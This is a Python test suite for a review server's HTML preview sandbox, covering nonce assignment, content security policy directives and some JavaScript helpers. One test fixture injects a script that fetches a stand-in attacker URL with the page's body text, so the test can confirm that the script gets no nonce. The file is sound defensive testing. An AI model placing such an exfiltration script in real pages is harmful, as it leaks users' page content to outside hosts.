#!/usr/bin/env python3
"""Regression coverage for the untrusted candidate preview boundary."""

from __future__ import annotations

from html.parser import HTMLParser
from pathlib import Path
import subprocess
import sys
import unittest


REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from review_server.http_api import _bridge_script, document_csp, inject_document  # noqa: E402


class ScriptCollector(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.scripts: list[dict[str, str | None]] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag == "script":
            self.scripts.append(dict(attrs))


class PreviewSecurityTests(unittest.TestCase):
    def test_only_source_snapshot_scripts_receive_the_response_nonce(self) -> None:
        original = """<!doctype html>
<html><head>
<script defer src="../assets/trusted.js"></script>
<script>window.trusted = true;</script>
</head><body><div class="page">Original</div></body></html>
"""
        candidate = original.replace("Original", "Candidate").replace(
            "</head>",
            """<script>fetch('https://attacker.invalid/' + document.body.textContent)</script>
<script src="../assets/unreviewed.js"></script></head>""",
        )
        nonce = "test-response-nonce"
        rendered = inject_document(
            candidate,
            original=original,
            view="candidate",
            nonce=nonce,
        ).decode("utf-8")
        parser = ScriptCollector()
        parser.feed(rendered)

        trusted = [item for item in parser.scripts if item.get("src") == "../assets/trusted.js"]
        unreviewed = [item for item in parser.scripts if item.get("src") == "../assets/unreviewed.js"]
        nonced = [item for item in parser.scripts if item.get("nonce") == nonce]
        self.assertEqual(len(trusted), 1)
        self.assertEqual(trusted[0].get("nonce"), nonce)
        self.assertEqual(len(unreviewed), 1)
        self.assertIsNone(unreviewed[0].get("nonce"))
        self.assertEqual(len(nonced), 3, "two trusted scripts plus the fixed review bridge execute")
        self.assertIn(".diagram{position:relative}", rendered)

    def test_raw_markers_inside_comments_and_scripts_do_not_swallow_injections(self) -> None:
        original = """<!doctype html>
<!-- <head> is not the document head -->
<html><head><title>Safe source</title></head>
<body><div class="page">Original</div></body></html>
"""
        candidate = original.replace(
            "<div class=\"page\">Original</div>",
            """<div class="page">Candidate</div>
<script>const marker = "</body>";</script>""",
        )
        nonce = "structural-nonce"
        rendered = inject_document(
            candidate,
            original=original,
            view="candidate",
            nonce=nonce,
        ).decode("utf-8")
        parser = ScriptCollector()
        parser.feed(rendered)

        self.assertIn('<head>\n<base href="/topics/">', rendered)
        self.assertEqual(len(parser.scripts), 2)
        self.assertIsNone(parser.scripts[0].get("nonce"))
        self.assertEqual(parser.scripts[1].get("nonce"), nonce)
        self.assertIn("var currentView=\"candidate\";", rendered)

    def test_document_policy_blocks_candidate_network_and_unnonced_scripts(self) -> None:
        policy = document_csp(4242, "fixed-nonce")
        directives = dict(
            part.strip().split(" ", 1)
            for part in policy.split(";")
            if part.strip()
        )

        self.assertEqual(directives["default-src"], "'none'")
        self.assertEqual(
            directives["base-uri"],
            "http://127.0.0.1:4242 http://localhost:4242",
        )
        self.assertEqual(directives["script-src"], "'nonce-fixed-nonce'")
        self.assertEqual(directives["connect-src"], "'none'")
        self.assertEqual(directives["form-action"], "'none'")
        self.assertEqual(directives["frame-src"], "'none'")
        self.assertNotIn("'unsafe-inline'", directives["script-src"])
        self.assertNotIn("http://", directives["script-src"])

    def test_bridge_uses_offsets_and_context_for_repeated_text(self) -> None:
        bridge = _bridge_script("candidate", "position-nonce")
        start = bridge.index("function anchorStart")
        end = bridge.index("\nfunction markText", start)
        function = bridge[start:end]
        program = function + """
const repeated = 'same then same';
if (anchorStart(repeated, {start:10,end:14}, 'same') !== 10) process.exit(1);
if (anchorStart(repeated, {start:0,end:4}, 'same') !== 0) process.exit(2);
if (anchorStart(repeated, {prefix:'same then '}, 'same') !== 10) process.exit(3);
if (anchorStart(repeated, {start:5,end:9}, 'same') !== -1) process.exit(4);
"""
        subprocess.run(["node", "-e", program], check=True)

    def test_original_mapping_and_candidate_targets_stay_separate(self) -> None:
        review_js = (REPO_ROOT / "assets" / "review.js").read_text(encoding="utf-8")
        start = review_js.index("  function anchorFor")
        end = review_js.index("  function quoteFor", start)
        functions = review_js[start:end]
        program = "var state = {view: 'original'};\n" + functions + """
const comment = {
  mapped: false,
  originalAnchor: {kind:'text',quote:'source',selector:{blockKey:'s01/p/1'}},
  candidateAnchor: {kind:'text',quote:'',mapped:false,unmapped:true},
  candidateTargets: [
    {kind:'text',quote:'one',selector:{blockKey:'s01/p/1'}},
    {kind:'text',quote:'two',selector:{blockKey:'s01/p/2'}}
  ]
};
if (!mapped(comment)) process.exit(1);
if (targetsFor(comment).length !== 1) process.exit(2);
state.view = 'candidate';
if (mapped(comment)) process.exit(3);
if (targetsFor(comment).length !== 2) process.exit(4);
"""
        subprocess.run(["node", "-e", program], check=True)

    def test_finalized_push_warning_rehydrates_in_a_new_page(self) -> None:
        review_js = (REPO_ROOT / "assets" / "review.js").read_text(encoding="utf-8")
        start = review_js.index("  function sessionFrom")
        end = review_js.index("  function jobRunning", start)
        functions = review_js[start:end]
        program = """var state = {complete:false,pushWarning:'',view:'original',job:null};
var api = {setRevision:function(){}};
function requestHighlights(){}
""" + functions + """
absorbSession({complete:true, finalized:{pushError:'remote unavailable'}, comments:[]});
if (!state.complete) process.exit(1);
if (state.pushWarning !== 'remote unavailable') process.exit(2);
"""
        subprocess.run(["node", "-e", program], check=True)


if __name__ == "__main__":
    unittest.main()
